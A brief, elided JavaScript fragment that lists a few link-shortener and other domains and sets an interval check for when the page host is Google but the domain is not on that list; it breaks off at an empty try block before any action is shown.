const dom = ['linkbnao.com', 'vip.linkbnao.com', 'go.linkbnao.com', 'h2244r.github.io','ctdbihar.in'],
...
(() => {
    let i = setInterval(() => {
        ...
        if (!dom.includes(document.domain) && window.location.host == 'www.google.com') {
            try {
